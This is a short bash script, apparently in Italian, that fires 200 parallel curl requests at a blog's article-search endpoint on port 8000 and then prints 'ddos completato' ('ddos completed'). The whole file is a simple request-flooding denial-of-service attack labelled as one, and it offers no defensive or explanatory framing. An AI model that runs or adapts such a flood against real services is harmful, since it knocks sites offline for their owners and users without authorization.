#!/bin/bash

for i in {1..200}
do
  curl -s "http://cyber.blog:8000/articles/search" > /dev/null &
done

wait
echo "ddos completato"